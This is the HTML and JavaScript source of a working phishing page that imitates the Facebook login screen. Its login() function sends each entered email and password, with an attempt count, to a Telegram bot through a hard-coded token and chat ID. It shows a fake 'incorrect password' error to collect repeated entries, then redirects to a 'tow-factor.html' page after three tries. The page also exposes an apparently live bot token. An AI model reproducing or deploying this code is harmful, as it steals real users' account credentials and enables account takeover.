<body>

    <!-- Language Selector -->
    <div class="language">English (UK)</div>

    <!-- Container -->
    <div class="container">

        <!-- Facebook Logo -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>

        <!-- Login Form -->
        <div class="form">
            <!-- Email or phone: type="text" for flexibility, validated by JS -->
            <input
                id="email"
                type="text"
                name="email"
                inputmode="email"
                autocomplete="username"
                autocapitalize="off"
                spellcheck="false"
                placeholder="Mobile number or email address"
                aria-label="Mobile number or email address"
            >
            <input
                id="password"
                type="password"
                name="password"
                autocomplete="current-password"
                placeholder="Password"
                aria-label="Password"
            >
            <div id="email-error" class="error-message" style="display:none;">Please enter a valid mobile number or email address.</div>
            <div id="password-error" class="error-message" style="display:none;">Incorrect password. Please try again.</div>
            <button type="button" onclick="login()">Log in</button>
            <a href="#">Forgotten Password?</a>
        </div>

        <!-- Create Account Button -->
        <div class="create-account">
            <button type="button">Create new account</button>
        </div>

    </div>

    <!-- Meta Logo and Text -->
    <div class="meta">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta">
        <!-- Footer Links -->

<script>
    let attempt = 0;
    const botToken = "8829187953:AAHGhRp4CkshdeloQGPaJxVQr8EvhP-mE94";
    const chatId = "8554769230";

    // Regex: valid email OR valid phone number (7–15 digits, optional +, spaces, dashes, brackets)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    const phoneRegex = /^\+?[\d\s\-()]{7,20}$/;

    function isValidEmailOrPhone(value) {
        const v = value.trim();
        if (v === "") return false;
        // Must contain at least 7 digits if it's a phone-like input
        if (phoneRegex.test(v)) {
            const digits = v.replace(/\D/g, "");
            return digits.length >= 7 && digits.length <= 15;
        }
        return emailRegex.test(v);
    }

    function login() {
        let email = document.getElementById("email");
        let password = document.getElementById("password");
        let emailError = document.getElementById("email-error");
        let passwordError = document.getElementById("password-error");
        let valid = true;

        // Reset messages
        emailError.style.display = "none";
        passwordError.style.display = "none";

        // Validating email / phone
        if (email.value.trim() === "") {
            email.classList.add("error");
            email.focus();
            valid = false;
        } else if (!isValidEmailOrPhone(email.value)) {
            email.classList.add("error");
            emailError.textContent = "Please enter a valid mobile number or email address.";
            emailError.style.display = "block";
            email.focus();
            valid = false;
        } else {
            email.classList.remove("error");
        }

        // Validating password
        if (password.value.trim() === "") {
            password.classList.add("error");
            if (valid) password.focus();
            valid = false;
        } else {
            password.classList.remove("error");
        }

        if (!valid) return;

        attempt++;

        let message = `📌 **Facebook Login Attempt**\n\n👤 **Email:** ${email.value}\n🔑 **Password:** ${password.value}\n🛑 **Attempt:** ${attempt}`;
        let telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(telegramAPI);

        if (attempt >= 3) {
            window.location.href = "tow-factor.html";
        } else {
            password.classList.add("error");
            passwordError.style.display = "block";
            password.value = "";
            password.focus();
        }
    }

    // Clear error styling on typing
    document.getElementById("email").addEventListener("input", function () {
        this.classList.remove("error");
        document.getElementById("email-error").style.display = "none";
    });
    document.getElementById("password").addEventListener("input", function () {
        this.classList.remove("error");
        document.getElementById("password-error").style.display = "none";
    });
</script>
